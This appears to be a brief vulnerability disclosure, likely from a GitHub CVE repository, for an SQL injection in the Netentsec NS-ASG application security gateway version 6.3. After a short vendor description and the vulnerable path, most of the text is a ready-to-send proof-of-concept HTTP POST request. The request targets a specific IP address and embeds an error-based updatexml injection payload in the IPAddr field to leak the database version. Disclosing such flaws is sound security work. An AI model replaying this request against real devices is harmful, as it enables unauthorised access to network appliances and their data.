Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3
Vulnerability Path ： /protocol/firewall/addmacbind


<img width="582" alt="图片" src="https://github.com/jikedaodao/cve/assets/160807146/c11eb84e-2978-4d7f-82a5-291a19832429">

Poc：
```
POST /protocol/index.php HTTP/1.1
Host: 1.85.53.53:443
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 263

jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(select+version())),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
```
<img width="565" alt="图片" src="https://github.com/jikedaodao/cve/assets/160807146/d68408f4-b237-4996-9d90-4bd6bbef9566">
